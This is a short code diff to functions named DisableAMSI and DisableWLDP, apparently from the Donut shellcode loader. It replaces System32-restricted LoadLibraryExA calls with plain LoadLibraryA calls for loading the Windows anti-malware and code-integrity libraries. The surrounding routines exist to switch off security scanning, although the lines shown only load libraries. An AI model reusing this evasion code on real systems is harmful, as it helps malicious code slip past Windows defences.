@@ -65,11 +65,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     DWORD   len, op, t;
     LPVOID  cs, func_ptr;
     
-    // load amsi
-    dll = inst->api.LoadLibraryExA(
-      inst->amsi.s, 
-      NULL, 
-      LOAD_LIBRARY_SEARCH_SYSTEM32);
+    // try load amsi
+    dll = inst->api.LoadLibraryA(inst->amsi.s);
     
     if(dll == NULL) return FALSE;
     
@@ -122,11 +119,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     BOOL           disabled = FALSE;
     _PHAMSICONTEXT ctx;
     
-    // load AMSI library
-    dll = inst->api.LoadLibraryExA(
-      inst->amsi.s, 
-      NULL, 
-      LOAD_LIBRARY_SEARCH_SYSTEM32);
+    // try load amsi
+    dll = inst->api.LoadLibraryA(inst->amsi.s);
       
     if(dll == NULL) return FALSE;
     
@@ -280,10 +274,8 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     DWORD   len, op, t;
     LPVOID  cs, func_ptr;
     
-    // load WLDP
-    wldp = inst->api.LoadLibraryExA(
-      inst->wldp, NULL, 
-      LOAD_LIBRARY_SEARCH_SYSTEM32);
+    // try load wldp
+    wldp = inst->api.LoadLibraryA(inst->wldp);
     
     if(wldp == NULL) return FALSE;
     
